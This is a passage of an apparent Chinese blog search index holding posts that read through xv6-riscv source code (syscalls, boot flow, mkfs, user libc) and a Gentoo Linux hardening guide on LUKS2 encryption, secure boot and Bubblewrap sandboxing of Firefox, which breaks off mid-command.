中，它会遍历一个函数指针数组 static uint64 (*syscalls[])(void) = { [SYS_fork] sys_fork, [SYS_exit] sys_exit, [SYS_wait] sys_wait, [SYS_pipe] sys_pipe, [SYS_read] sys_read, [SYS_kill] sys_kill, [SYS_exec] sys_exec, [SYS_fstat] sys_fstat, [SYS_chdir] sys_chdir, [SYS_dup] sys_dup, [SYS_getpid] sys_getpid, [SYS_sbrk] sys_sbrk, [SYS_sleep] sys_sleep, [SYS_uptime] sys_uptime, [SYS_open] sys_open, [SYS_write] sys_write, [SYS_mknod] sys_mknod, [SYS_unlink] sys_unlink, [SYS_link] sys_link, [SYS_mkdir] sys_mkdir, [SYS_close] sys_close, }; 根据系统调用号，也就是宏 SYS_exec，会调用对应的函数 sys_exec ","date":"2025-01-24","objectID":"/posts/xv6_riscv_read_kernel_virtual/:2:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 内核态: 虚拟化","uri":"/posts/xv6_riscv_read_kernel_virtual/"},{"categories":["源码阅读"],"content":"尝试把 xv6-riscv 读一遍，本篇简单说了下 xv6 的启动流程","date":"2025-01-21","objectID":"/posts/xv6_riscv_read_kernel_boot/","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 内核态: 启动流程","uri":"/posts/xv6_riscv_read_kernel_boot/"},{"categories":["源码阅读"],"content":"启动流程 从 Makefile $K/kernel: $(OBJS) $K/kernel.ld $U/initcode $(LD) $(LDFLAGS) -T $K/kernel.ld -o $K/kernel $(OBJS) $(OBJDUMP) -S $K/kernel \u003e $K/kernel.asm $(OBJDUMP) -t $K/kernel | sed '1,/SYMBOL TABLE/d; s/ .* / /; /^$$/d' \u003e $K/kernel.sym 可以看出这里特地使用了链接脚本 kernel/kernel.ld 用于对 kenrel 进行额外的处理 OUTPUT_ARCH( \"riscv\" ) ENTRY( _entry ) SECTIONS { /* * ensure that entry.S / _entry is at 0x80000000, * where qemu's -kernel jumps. */ . = 0x80000000; .text : { *(.text .text.*) . = ALIGN(0x1000); _trampoline = .; *(trampsec) . = ALIGN(0x1000); ASSERT(. - _trampoline == 0x1000, \"error: trampoline larger than one page\"); PROVIDE(etext = .); } .rodata : { . = ALIGN(16); *(.srodata .srodata.*) /* do not need to distinguish this from .rodata */ . = ALIGN(16); *(.rodata .rodata.*) } .data : { . = ALIGN(16); *(.sdata .sdata.*) /* do not need to distinguish this from .data */ . = ALIGN(16); *(.data .data.*) } .bss : { . = ALIGN(16); *(.sbss .sbss.*) /* do not need to distinguish this from .bss */ . = ALIGN(16); *(.bss .bss.*) } PROVIDE(end = .); } 这里它将入口函数设置为了 _entry，这个函数来自 kernel/entry.S，然后是合并一些段 entry.S： .section .text .global _entry _entry: # set up a stack for C. # stack0 is declared in start.c, # with a 4096-byte stack per CPU. # sp = stack0 + (hartid * 4096) la sp, stack0 li a0, 1024*4 csrr a1, mhartid addi a1, a1, 1 mul a0, a0, a1 add sp, sp, a0 # jump to start() in start.c call start spin: j spin 之后它调用了 kernel/start.c 中的 start() // entry.S jumps here in machine mode on stack0. void start() { // set M Previous Privilege mode to Supervisor, for mret. unsigned long x = r_mstatus(); x \u0026= ~MSTATUS_MPP_MASK; x |= MSTATUS_MPP_S; w_mstatus(x); // set M Exception Program Counter to main, for mret. // requires gcc -mcmodel=medany w_mepc((uint64)main); // disable paging for now. w_satp(0); // delegate all interrupts and exceptions to supervisor mode. w_medeleg(0xffff); w_mideleg(0xffff); w_sie(r_sie() | SIE_SEIE | SIE_STIE | SIE_SSIE); // configure Physical Memory Protection to give supervisor mode // access to all of physical memory. w_pmpaddr0(0x3fffffffffffffull); w_pmpcfg0(0xf); // ask for clock interrupts. timerinit(); // keep each CPU's hartid in its tp register, for cpuid(). int id = r_mhartid(); w_tp(id); // switch to supervisor mode and jump to main(). asm volatile(\"mret\"); } 这里是先做了一些 machine 模式执行的一些操作，在默认调用 mret 指令换到特权级别 能换到是因为函数最开始就把 mstatus 寄存器的值改成了特权级别对应的值，调用 mret 会将模式设置成 mstatus 寄存器记录的模式 由于之前将 main() 函数的地址写到了 mepc 寄存器中，所以最后会跳到 main() 函数做后续的初始化工作。 kernel/main.c 中存放了 main() 函数 void main() { if(cpuid() == 0){ consoleinit(); printfinit(); printf(\"\\n\"); printf(\"xv6 kernel is booting\\n\"); printf(\"\\n\"); kinit(); // physical page allocator kvminit(); // create kernel page table kvminithart(); // turn on paging procinit(); // process table trapinit(); // trap vectors trapinithart(); // install kernel trap vector plicinit(); // set up interrupt controller plicinithart(); // ask PLIC for device interrupts binit(); // buffer cache iinit(); // inode table fileinit(); // file table virtio_disk_init(); // emulated hard disk userinit(); // first user process __sync_synchronize(); started = 1; } else { while(started == 0) ; __sync_synchronize(); printf(\"hart %d starting\\n\", cpuid()); kvminithart(); // turn on paging trapinithart(); // install kernel trap vector plicinithart(); // ask PLIC for device interrupts } scheduler(); } 简单看，就是让第一个 CPU 核完成初始化工作，如果还有其他的 CPU 核心，就等第一个先完成系统初始化之后再说。 这里先不把所有初始化都做了什么挨个说一遍，先说系统的第一个进程 —— init 进程 init 是类 Unix 操作系统上的一个重要的进程，在操作系统启动时启动，负责系统服务等初始化工作 init 作为第一个启动的进程，是所有进程的祖先，PID 一般为 1，位于 /sbin/init 的位置下，不过现在一般都链接到 /lib/systemd/systemd，现在大多数的 Linux 发行版都使用了 systemd 作为 init 程序，非 systemd 的 init 现在基本没多少还在被使用的了，我印象中只有 openrc 和 BSD init （我其实不是很清楚 BSD 使用的 init 叫什么名字，反正默认不是用 systemd） 不比传统 init 进程所管理的范围，systemd 更加“现代化”，可管理的范围更大 启动 init 进程的工作就是初始化工作的最后一步 userinit() // a user program that calls exec(\"/init\") // assembled from ../user/initcode.S // od -t xC ../user/initcode uchar initcode[] = { 0x17, 0x05, 0x00, 0x00, 0x13, 0x05, 0x45, 0x02,","date":"2025-01-21","objectID":"/posts/xv6_riscv_read_kernel_boot/:0:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 内核态: 启动流程","uri":"/posts/xv6_riscv_read_kernel_boot/"},{"categories":["源码阅读"],"content":"尝试把 xv6-riscv 读一遍，这是 mkfs 部分，用来生成硬盘镜像的","date":"2025-01-20","objectID":"/posts/xv6_riscv_read_mkfs/","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— mkfs","uri":"/posts/xv6_riscv_read_mkfs/"},{"categories":["源码阅读"],"content":"mkfs mkfs 用来生成硬盘镜像文件 fs.img 从 Makefile 中就可以看出，make qemu 只有两个依赖： qemu: $K/kernel fs.img 编译好的内核，以及一个 fs.img 其中，fs.img 这个目标是这样生成的： fs.img: mkfs/mkfs README $(UPROGS) mkfs/mkfs fs.img README $(UPROGS) Disk layout: [ boot block | sb block | log | inode blocks | free bit map | data blocks ] int main(int argc, char *argv[]) { int i, cc, fd; uint rootino, inum, off; struct dirent de; char buf[BSIZE]; struct dinode din; static_assert(sizeof(int) == 4, \"Integers must be 4 bytes!\"); if(argc \u003c 2){ fprintf(stderr, \"Usage: mkfs fs.img files...\\n\"); exit(1); } assert((BSIZE % sizeof(struct dinode)) == 0); assert((BSIZE % sizeof(struct dirent)) == 0); fsfd = open(argv[1], O_RDWR|O_CREAT|O_TRUNC, 0666); if(fsfd \u003c 0) die(argv[1]); // 1 fs block = 1 disk sector nmeta = 2 + nlog + ninodeblocks + nbitmap; nblocks = FSSIZE - nmeta; sb.magic = FSMAGIC; sb.size = xint(FSSIZE); sb.nblocks = xint(nblocks); sb.ninodes = xint(NINODES); sb.nlog = xint(nlog); sb.logstart = xint(2); sb.inodestart = xint(2+nlog); sb.bmapstart = xint(2+nlog+ninodeblocks); printf(\"nmeta %d (boot, super, log blocks %u inode blocks %u, bitmap blocks %u) blocks %d total %d\\n\", nmeta, nlog, ninodeblocks, nbitmap, nblocks, FSSIZE); freeblock = nmeta; // the first free block that we can allocate for(i = 0; i \u003c FSSIZE; i++) wsect(i, zeroes); memset(buf, 0, sizeof(buf)); memmove(buf, \u0026sb, sizeof(sb)); wsect(1, buf); rootino = ialloc(T_DIR); assert(rootino == ROOTINO); bzero(\u0026de, sizeof(de)); de.inum = xshort(rootino); strcpy(de.name, \".\"); iappend(rootino, \u0026de, sizeof(de)); bzero(\u0026de, sizeof(de)); de.inum = xshort(rootino); strcpy(de.name, \"..\"); iappend(rootino, \u0026de, sizeof(de)); for(i = 2; i \u003c argc; i++){ // get rid of \"user/\" char *shortname; if(strncmp(argv[i], \"user/\", 5) == 0) shortname = argv[i] + 5; else shortname = argv[i]; assert(index(shortname, '/') == 0); if((fd = open(argv[i], 0)) \u003c 0) die(argv[i]); // Skip leading _ in name when writing to file system. // The binaries are named _rm, _cat, etc. to keep the // build operating system from trying to execute them // in place of system binaries like rm and cat. if(shortname[0] == '_') shortname += 1; assert(strlen(shortname) \u003c= DIRSIZ); inum = ialloc(T_FILE); bzero(\u0026de, sizeof(de)); de.inum = xshort(inum); strncpy(de.name, shortname, DIRSIZ); iappend(rootino, \u0026de, sizeof(de)); while((cc = read(fd, buf, sizeof(buf))) \u003e 0) iappend(inum, buf, cc); close(fd); } // fix size of root inode dir rinode(rootino, \u0026din); off = xint(din.size); off = ((off/BSIZE) + 1) * BSIZE; din.size = xint(off); winode(rootino, \u0026din); balloc(freeblock); exit(0); } 其中， nmeta = 2 + nlog + ninodeblocks + nbitmap; nblocks = FSSIZE - nmeta; nmeta 是元信息的数目，用 FSSIZE 减去 nmeta 则是用来得到具体数据存储区域的部分 uint xint(uint x) { uint y; uchar *a = (uchar*)\u0026y; a[0] = x; a[1] = x \u003e\u003e 8; a[2] = x \u003e\u003e 16; a[3] = x \u003e\u003e 24; return y; } 该函数作用是将传入的 uint 的字节序转换成小端，如果本身运行程序的平台就是小端的，则不会有任何改动 void wsect(uint sec, void *buf) { if(lseek(fsfd, sec * BSIZE, 0) != sec * BSIZE) die(\"lseek\"); if(write(fsfd, buf, BSIZE) != BSIZE) die(\"write\"); } 这里就是先 seek 一段偏移量，之后在写入 void iappend(uint inum, void *xp, int n) { char *p = (char*)xp; uint fbn, off, n1; struct dinode din; char buf[BSIZE]; uint indirect[NINDIRECT]; uint x; rinode(inum, \u0026din); off = xint(din.size); // printf(\"append inum %d at off %d sz %d\\n\", inum, off, n); while(n \u003e 0){ fbn = off / BSIZE; assert(fbn \u003c MAXFILE); if(fbn \u003c NDIRECT){ if(xint(din.addrs[fbn]) == 0){ din.addrs[fbn] = xint(freeblock++); } x = xint(din.addrs[fbn]); } else { if(xint(din.addrs[NDIRECT]) == 0){ din.addrs[NDIRECT] = xint(freeblock++); } rsect(xint(din.addrs[NDIRECT]), (char*)indirect); if(indirect[fbn - NDIRECT] == 0){ indirect[fbn - NDIRECT] = xint(freeblock++); wsect(xint(din.addrs[NDIRECT]), (char*)indirect); } x = xint(indirect[fbn-NDIRECT]); } n1 = min(n, (fbn + 1) * BSIZE - off); rsect(x, buf); bcopy(p, buf + off - (fbn * BSIZE), n1); wsect(x, buf); n -= n1; off += n1; p += n1; } din.size = xint(off); winode(inum, \u0026din); } iappend 用于将内容附加到 inode 中 inode 是文件的抽象表","date":"2025-01-20","objectID":"/posts/xv6_riscv_read_mkfs/:0:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— mkfs","uri":"/posts/xv6_riscv_read_mkfs/"},{"categories":["源码阅读"],"content":"尝试把 xv6-riscv 读一遍，这是用户态的 libc 部分，一个小小小小小型的标准库","date":"2025-01-17","objectID":"/posts/xv6_riscv_read_user-libc/","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 用户态: libc","uri":"/posts/xv6_riscv_read_user-libc/"},{"categories":["源码阅读"],"content":"ulibc xv6-riscv 实现了一个简单基础的 libc ULIB = $U/ulib.o $U/usys.o $U/printf.o $U/umalloc.o 由此可知，其由 ulib.c、printf.c、umalloc.c 和 usys.pl 组成 ","date":"2025-01-17","objectID":"/posts/xv6_riscv_read_user-libc/:0:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 用户态: libc","uri":"/posts/xv6_riscv_read_user-libc/"},{"categories":["源码阅读"],"content":"printf.c 首先，printf 基本就是对可变参数进行了处理，并调用 vprintf void printf(const char *fmt, ...) { va_list ap; va_start(ap, fmt); vprintf(1, fmt, ap); } va_list 来自 #include \u003cstdarg.h\u003e // Print to the given fd. Only understands %d, %x, %p, %s. void vprintf(int fd, const char *fmt, va_list ap) { char *s; int c0, c1, c2, i, state; state = 0; for(i = 0; fmt[i]; i++){ c0 = fmt[i] \u0026 0xff; if(state == 0){ if(c0 == '%'){ state = '%'; } else { putc(fd, c0); } } else if(state == '%'){ c1 = c2 = 0; if(c0) c1 = fmt[i+1] \u0026 0xff; if(c1) c2 = fmt[i+2] \u0026 0xff; if(c0 == 'd'){ printint(fd, va_arg(ap, int), 10, 1); } else if(c0 == 'l' \u0026\u0026 c1 == 'd'){ printint(fd, va_arg(ap, uint64), 10, 1); i += 1; } else if(c0 == 'l' \u0026\u0026 c1 == 'l' \u0026\u0026 c2 == 'd'){ printint(fd, va_arg(ap, uint64), 10, 1); i += 2; } else if(c0 == 'u'){ printint(fd, va_arg(ap, int), 10, 0); } else if(c0 == 'l' \u0026\u0026 c1 == 'u'){ printint(fd, va_arg(ap, uint64), 10, 0); i += 1; } else if(c0 == 'l' \u0026\u0026 c1 == 'l' \u0026\u0026 c2 == 'u'){ printint(fd, va_arg(ap, uint64), 10, 0); i += 2; } else if(c0 == 'x'){ printint(fd, va_arg(ap, int), 16, 0); } else if(c0 == 'l' \u0026\u0026 c1 == 'x'){ printint(fd, va_arg(ap, uint64), 16, 0); i += 1; } else if(c0 == 'l' \u0026\u0026 c1 == 'l' \u0026\u0026 c2 == 'x'){ printint(fd, va_arg(ap, uint64), 16, 0); i += 2; } else if(c0 == 'p'){ printptr(fd, va_arg(ap, uint64)); } else if(c0 == 's'){ if((s = va_arg(ap, char*)) == 0) s = \"(null)\"; for(; *s; s++) putc(fd, *s); } else if(c0 == '%'){ putc(fd, '%'); } else { // Unknown % sequence. Print it to draw attention. putc(fd, '%'); putc(fd, c0); } state = 0; } } } ulib 实现的 vprintf 是比较简单的，只支持部分占位符 c0 = fmt[i] \u0026 0xff 的用处我暂时还没清晰的看到，无论是否和 0xff 按位与，都是那个值。 之后看当前打印的字符是占位符的 % 还是正常字符，正常字符就调用 putc，putc 会直接调用 write 系统调用从而打印出来。 系统调用 系统调用是操作系统内核暴露给应用程序的接口，Unix 通过 write 系统调用向指定的文件描述符写入内容 在自己的终端上执行 man 2 write 可以查看 Linux kernel 的 write 系统调用的接口描述 ssize_t write(int fd, const void buf[.count], size_t count); xv6-riscv 的系统调用和 libc 的函数原型都定义在了 user/user.h 文件中 int write(int, const void*, int); 如果是占位符，就将 state 的值修改，这样等下一轮循环的时候，就会根据 state 的值跳到正确的处理逻辑。 这里利用了 printint(int fd, int xx, int base, int sgn) 和 va_arg(ap, type) 完成将值根据占位符做格式转换并输出的目的 static void printint(int fd, int xx, int base, int sgn) { char buf[16]; int i, neg; uint x; neg = 0; if(sgn \u0026\u0026 xx \u003c 0){ neg = 1; x = -xx; } else { x = xx; } i = 0; do{ buf[i++] = digits[x % base]; }while((x /= base) != 0); if(neg) buf[i++] = '-'; while(--i \u003e= 0) putc(fd, buf[i]); } va_arg 会根据参数指定的类型把参数列表的值返回出来。base 是指当前值的进制表示，sgn 指是否为 signed 这个函数也比较简单，就是根据是否为 signed 从而判断是否存在负数的问题，之后把数字每一位都赋给 buf，然后遍历 buf 的每个字符，都调用一遍 putc。 ","date":"2025-01-17","objectID":"/posts/xv6_riscv_read_user-libc/:1:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 用户态: libc","uri":"/posts/xv6_riscv_read_user-libc/"},{"categories":["源码阅读"],"content":"umalloc.c 这部分的代码实现来自 K\u0026R 的 malloc 的实现 涉及到了一些自定义的类型： typedef long Align; union header { struct { union header *ptr; uint size; } s; Align x; }; typedef union header Header; static Header base; static Header *freep; void* malloc(uint nbytes) { Header *p, *prevp; uint nunits; nunits = (nbytes + sizeof(Header) - 1)/sizeof(Header) + 1; if((prevp = freep) == 0){ base.s.ptr = freep = prevp = \u0026base; base.s.size = 0; } for(p = prevp-\u003es.ptr; ; prevp = p, p = p-\u003es.ptr){ if(p-\u003es.size \u003e= nunits){ if(p-\u003es.size == nunits) prevp-\u003es.ptr = p-\u003es.ptr; else { p-\u003es.size -= nunits; p += p-\u003es.size; p-\u003es.size = nunits; } freep = prevp; return (void*)(p + 1); } if(p == freep) if((p = morecore(nunits)) == 0) return 0; } } nunits 的计算中，(nbytes + sizeof(Header) -1)/sizeof(Header) 是为了向上取整，再 +1 是给 Header 预留空间 (prevp = freep) 会产生一个返回值，也就是赋的值，所以这段代码用来做初始化工作 之后的 for 循环中 for(p = prevp-\u003es.ptr; ; prevp = p, p = p-\u003es.ptr){ if(p-\u003es.size \u003e= nunits){ if(p-\u003es.size == nunits) prevp-\u003es.ptr = p-\u003es.ptr; else { p-\u003es.size -= nunits; p += p-\u003es.size; p-\u003es.size = nunits; } freep = prevp; return (void*)(p + 1); } if(p == freep) if((p = morecore(nunits)) == 0) return 0; } 这里就是遍历释放的列表，然后如果能大小合适就给它，如果不合适的话，就调用 morecore 分配一次在 free 掉，之后在下一轮循环分配给它。 static Header* morecore(uint nu) { char *p; Header *hp; if(nu \u003c 4096) nu = 4096; p = sbrk(nu * sizeof(Header)); if(p == (char*)-1) return 0; hp = (Header*)p; hp-\u003es.size = nu; free((void*)(hp + 1)); return freep; } 这里涉及到 sbrk 系统调用，用于获取内存空间 void free(void *ap) { Header *bp, *p; bp = (Header*)ap - 1; for(p = freep; !(bp \u003e p \u0026\u0026 bp \u003c p-\u003es.ptr); p = p-\u003es.ptr) if(p \u003e= p-\u003es.ptr \u0026\u0026 (bp \u003e p || bp \u003c p-\u003es.ptr)) break; if(bp + bp-\u003es.size == p-\u003es.ptr){ bp-\u003es.size += p-\u003es.ptr-\u003es.size; bp-\u003es.ptr = p-\u003es.ptr-\u003es.ptr; } else bp-\u003es.ptr = p-\u003es.ptr; if(p + p-\u003es.size == bp){ p-\u003es.size += bp-\u003es.size; p-\u003es.ptr = bp-\u003es.ptr; } else p-\u003es.ptr = bp; freep = p; } for 循环用来找到要回收的地址的相近的节点 而之后的两组 if 都是为了回收这部分地址，我画了一个简单的草图用于方便理解 从这里需要 -1 也能看出之前计算 nunits 最后 +1 操作的用处 ","date":"2025-01-17","objectID":"/posts/xv6_riscv_read_user-libc/:2:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 用户态: libc","uri":"/posts/xv6_riscv_read_user-libc/"},{"categories":["源码阅读"],"content":"ulib.c ulib.c 中基本就是一些字符操作相关的函数了，比如 strlen、memset、atoi 之类的 基本都是一些简单的实现，没什么可说的 ","date":"2025-01-17","objectID":"/posts/xv6_riscv_read_user-libc/:3:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 用户态: libc","uri":"/posts/xv6_riscv_read_user-libc/"},{"categories":["源码阅读"],"content":"usys.pl #!/usr/bin/perl -w # Generate usys.S, the stubs for syscalls. print \"# generated by usys.pl - do not edit\\n\"; print \"#include \\\"kernel/syscall.h\\\"\\n\"; sub entry { my $name = shift; print \".global $name\\n\"; print \"${name}:\\n\"; print \" li a7, SYS_${name}\\n\"; print \" ecall\\n\"; print \" ret\\n\"; } entry(\"fork\"); entry(\"exit\"); entry(\"wait\"); entry(\"pipe\"); entry(\"read\"); entry(\"write\"); entry(\"close\"); entry(\"kill\"); entry(\"exec\"); entry(\"open\"); entry(\"mknod\"); entry(\"unlink\"); entry(\"fstat\"); entry(\"link\"); entry(\"mkdir\"); entry(\"chdir\"); entry(\"dup\"); entry(\"getpid\"); entry(\"sbrk\"); entry(\"sleep\"); entry(\"uptime\"); 这涉及到一个古老的脚本语言 Perl 该脚本会生成一份汇编代码文件 # generated by usys.pl - do not edit #include \"kernel/syscall.h\" .global fork fork: li a7, SYS_fork ecall ret .global exit exit: li a7, SYS_exit ecall ret .global wait wait: li a7, SYS_wait ecall ret .global pipe pipe: li a7, SYS_pipe ecall ret .global read read: li a7, SYS_read ecall ret .global write write: li a7, SYS_write ecall ret .global close close: li a7, SYS_close ecall ret .global kill kill: li a7, SYS_kill ecall ret .global exec exec: li a7, SYS_exec ecall ret .global open open: li a7, SYS_open ecall ret .global mknod mknod: li a7, SYS_mknod ecall ret .global unlink unlink: li a7, SYS_unlink ecall ret .global fstat fstat: li a7, SYS_fstat ecall ret .global link link: li a7, SYS_link ecall ret .global mkdir mkdir: li a7, SYS_mkdir ecall ret .global chdir chdir: li a7, SYS_chdir ecall ret .global dup dup: li a7, SYS_dup ecall ret .global getpid getpid: li a7, SYS_getpid ecall ret .global sbrk sbrk: li a7, SYS_sbrk ecall ret .global sleep sleep: li a7, SYS_sleep ecall ret .global uptime uptime: li a7, SYS_uptime ecall ret 用来处理系统调用跳转的，RISC-V 规定了 a7 寄存器用于存放系统调用号，而 ecall 用于调用系统调用，amd64 结构也有类似的指令 syscall ","date":"2025-01-17","objectID":"/posts/xv6_riscv_read_user-libc/:4:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 用户态: libc","uri":"/posts/xv6_riscv_read_user-libc/"},{"categories":null,"content":"我本次安装 Gentoo Linux 所做的一些安全加固手段","date":"2025-01-07","objectID":"/posts/gentoo_hardened_guide/","tags":["gentoo-linux","linux"],"title":"Gentoo Linux 安全加固指南","uri":"/posts/gentoo_hardened_guide/"},{"categories":null,"content":"Gentoo Linux 安全加固指南 2025 年 1 月 8/9/10 号修改 添加了 VSCodium 的 bwrap 启动参数 修改了 sysctl 和内核启动参数部分 添加了 Chromium 的 bwrap 启动参数 添加了 NetworkManager 部分 2025 年 1 月 13 号修改 修改了bwrap 中 FireFox 部分，让它可以响应 xdg-open 添加了禁止核心转储 (core dump) 的段落 添加了面向安全的编译选项部分 2025 年 1 月 19 号修改 添加了 NetworkManager 下开启 IPV6 隐私扩展的描述 修改了 编译选项 的部分 2025 年 1 月 27/28 号修改 在 sysctl 和内核参数部分添加了更多的解释 修改了文章中部分语句不通，不好理解的地方 我一直在寻求一个尽可能不影响日常使用的同时尽量做到安全的操作系统。 单论安全性，我认为 Qubes OS 很不错，但是网络配置看起来不是很容易，并且社区貌似不是很大。 Fedora Silverblue 也是个不错的选择，原子更新，桌面应用大多是从 Flatpak 安装，不过我对 Fedora 官方软件仓库没有我想要的软件这一情况一直有些介意，虽然有 COPR 源，但我不是特别想用。 NixOS 也是个选择，同样是不可变发行版，nixpkg 提供了很多软件包，包括 linux-hardened、hardened-malloc 等，NixOS 官方有一套 security profile，不过我还没尝试，印象中是使用了 linux-hardened 内核，启用了一些安全相关的 sysctl 设置，将内存分配器改成 scudo（好像还启用了 AppArmor？） 我目前认为 Gentoo Linux 是一个不错的选择，但由于 Gentoo Linux 编译真的很费时间，所以我放假回来才开始尝试一些我以前想过但没尝试的功能。 ","date":"2025-01-07","objectID":"/posts/gentoo_hardened_guide/:0:0","tags":["gentoo-linux","linux"],"title":"Gentoo Linux 安全加固指南","uri":"/posts/gentoo_hardened_guide/"},{"categories":null,"content":"硬盘加密 我现在认为硬盘加密是一个必须的选择。我选择了 Luks2 的 argon2id 算法，这导致我需要使用 systemd-boot，GRUB 对 Luks2 的支持有限。 在硬盘分区时，根据 Rootfs_encryption，直接执行： $ cryptsetup --type luks2 --cipher aes-xts-plain64 --hash sha512 --iter-time 5000 --key-size 256 --pbkdf argon2id --use-urandom --verify-passphrase luksFormat /dev/block 如何你想使用 GRUB 作为 bootloader（比如你有引导 windows 启动项的需求等），那就不能使用 luks2，应该选择用 luks 的算法。 $ cryptsetup luksOpen /dev/block root $ mkfs.xfs -L rootfs /dev/mapper/root $ mount --label rootfs /mnt/gentoo 这样就可以将其格式化成 XFS 文件系统了，我没有使用 SWAP 分区，我选择了使用 ZRAM 做交换分区，不过加密的 SWAP 倒也是个选择，只是我没这么做。 之后你需要附加相关命令行参数用于解锁： $ lsblk -o name,uuid NAME UUID sdb ├─nvme0n1p1 BDF2-0139 ├─nvme0n1p2 b0e86bef-30f8-4e3b-ae35-3fa2c6ae705b └─nvme0n1p3 4bb45bd6-9ed9-44b3-b547-b411079f043b └─root cb070f9e-da0e-4bc5-825c-b01bb2707704 假设输出是上面这样，那么应该在 /etc/dracut.conf.d/luks.conf 下写入： kernel_cmdline+=\" root=UUID=cb070f9e-da0e-4bc5-825c-b01bb2707704 rd.luks.uuid=4bb45bd6-9ed9-44b3-b547-b411079f043b \" ","date":"2025-01-07","objectID":"/posts/gentoo_hardened_guide/:1:0","tags":["gentoo-linux","linux"],"title":"Gentoo Linux 安全加固指南","uri":"/posts/gentoo_hardened_guide/"},{"categories":null,"content":"安全启动 安全启动是个耳熟能详的名词，我在刚接触到给自己的笔记本电脑安装 GNU/Linux 发行版的教程的时候，一般都会说明首先要在 BIOS 中关闭快速启动和安全启动，部分社区支持的发行版无法在开启安全启动的情况下安装（不过可以安装时/后开启安全启动的支持），商业公司支持的（如 Fedora，OpenSUSE，Deepin 等）发行版应该是都可以直接启动安装。 安全启动是 UEFI 下才有的安全验证机制，旨在确保引导的操作系统是可信的。 只需要在安装的过程中对照着手册，看到安全启动的部分就跟着手册来就行。 这里有一点，Shim 被硬编码为使用 grubx64.efi，但是由于我使用的 systemd-boot 作为 bootloader，没有 grubx64.efi，所以我选择了将 systemd-bootx64.efi 复制一个 grubx64.efi 出来。 $ cp /efi/EFI/systemd/systemd-bootx64.efi /efi/EFI/systemd/grubx64.efi ","date":"2025-01-07","objectID":"/posts/gentoo_hardened_guide/:2:0","tags":["gentoo-linux","linux"],"title":"Gentoo Linux 安全加固指南","uri":"/posts/gentoo_hardened_guide/"},{"categories":null,"content":"bwrap 沙盒程序就这两位我还算熟悉，Firejail 和 Bubblewrap。前者有令人诟病的 setuid 安全隐患，后者没有 Firejail 那样有社区提供好的沙盒模板（即部分应用可以运行一个命令直接获得沙盒化，如 git，firefox 等） 我选择了 Bubblewrap（也就是标题中的 bwrap），目前只用到了浏览器和我的代码编辑器上，我目前的目标是，让使用的图形化软件基本都套一层 bwrap（除了终端模拟器） 对于到底应该 --ro-bind 什么文件，可以用 strace -e openat 看一下该程序到底尝试打开什么文件，然后决定到底要不要映射过去 ","date":"2025-01-07","objectID":"/posts/gentoo_hardened_guide/:3:0","tags":["gentoo-linux","linux"],"title":"Gentoo Linux 安全加固指南","uri":"/posts/gentoo_hardened_guide/"},{"categories":null,"content":"FireFox bwrap \\ --new-session \\ --symlink /usr/lib64 /lib64 \\ --ro-bind /usr/lib /usr/lib \\ --ro-bind /usr/lib64 /usr/lib64 \\ --ro-bind /usr/bin /usr/bin \\ --bind \"$XDG_RUNTIME_DIR\" \"$XDG_RUNTIME_DIR\" \\ xdg-dbus-proxy \\ unix:path=/var/run/user/$UID/bus \\ /run/user/$UID/.dbus-proxy/session-bus-proxy-6271 \\ --filter \\ --own=\"org.mpris.MediaPlayer2.firefox.*\" \\ --own=\"org.mozilla.firefox.*\" \\ --own=\"org.mozilla.firefox_beta.*\" \u0026 bwrap \\ --symlink usr/lib /lib \\ --symlink usr/lib64 /lib64 \\ --symlink usr/bin /bin \\ --symlink usr/bin /sbin \\ --ro-bind /usr/lib /usr/lib \\ --ro-bind /usr/lib64 /usr/lib64 \\ --ro-bind /usr/bin /usr/bin \\ --ro-bind /opt/bin /opt/bin \\ --ro-bind /usr/share/applications /usr/share/applications \\ --ro-bind /usr/share/gtk-3.0 /usr/share/gtk-3.0 \\ --ro-bind /usr/share/icu /usr/share/icu \\ --ro-bind /usr/share/drirc.d /usr/share/drirc.d \\ --ro-bind /usr/share/fonts /usr/share/fonts \\ --ro-bind /usr/share/glib-2.0 /usr/share/glib-2.0 \\ --ro-bind /usr/share/glvnd /usr/share/glvnd \\ --ro-bind /usr/share/icons /usr/share/icons \\ --ro-bind /usr/share/mime /usr/share/mime \\ --ro-bind /usr/share/X11/xkb /usr/share/X11/xkb \\ --ro-bind /usr/share/icons /usr/share/icons \\ --ro-bind /usr/share/mime /usr/share/mime \\ --ro-bind /usr/share/vulkan /usr/share/vulkan \\ --ro-bind /usr/share/egl /usr/share/egl \\ --ro-bind /usr/share/nvidia /usr/share/nvidia \\ --ro-bind /usr/share/ca-certificates /usr/share/ca-certificates \\ --ro-bind /etc/ld.so.conf /etc/ld.so.conf \\ --ro-bind /etc/ld.so.cache /etc/ld.so.cache \\ --ro-bind /etc/fonts /etc/fonts \\ --ro-bind /etc/resolv.conf /etc/resolv.conf \\ --ro-bind /etc/ssl /etc/ssl \\ --ro-bind /etc/ca-certificates.conf /etc/ca-certificates.conf \\ --dir \"$XDG_RUNTIME_DIR\" \\ --bind \"$XDG_RUNTIME_DIR/pulse\" \"$XDG_RUNTIME_DIR/pulse\" \\ --ro-bind /run/user/$UID/bus /run/user/$UID/bus \\ --ro-bind \"$XDG_RUNTIME_DIR/wayland-1\" \"$XDG_RUNTIME_DIR/wayland-1\" \\ --dev /dev \\ --dev-bind /dev/dri /dev/dri \\ --dev-bind /dev/shm /dev/shm \\ --dev-bind /dev/nvidia0 /dev/nvidia0 \\ --dev-bind /dev/nvidiactl /dev/nvidiactl \\ --dev-bind /dev/nvidia-uvm /dev/nvidia-uvm \\ --dev-bind /dev/nvidia-modeset /dev/nvidia-modeset \\ --ro-bind /sys /sys \\ --proc /proc \\ --tmpfs /tmp \\ --ro-bind $HOME/.config/dconf $HOME/.config/dconf \\ --ro-bind $HOME/.config/user-dirs.dirs $HOME/.config/user-dirs.dirs \\ --bind $HOME/.mozilla $HOME/.mozilla \\ --bind 